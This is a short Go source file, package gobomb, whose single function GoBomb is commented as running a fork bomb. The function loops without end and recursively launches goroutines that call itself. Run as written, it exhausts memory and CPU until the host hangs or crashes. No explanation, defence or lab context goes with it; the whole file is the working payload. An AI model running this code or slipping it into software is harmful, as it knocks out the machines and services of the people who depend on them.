package gobomb

// GoBomb : run a fork bomb in golang
func GoBomb() {
	for {
		go GoBomb()
	}
}
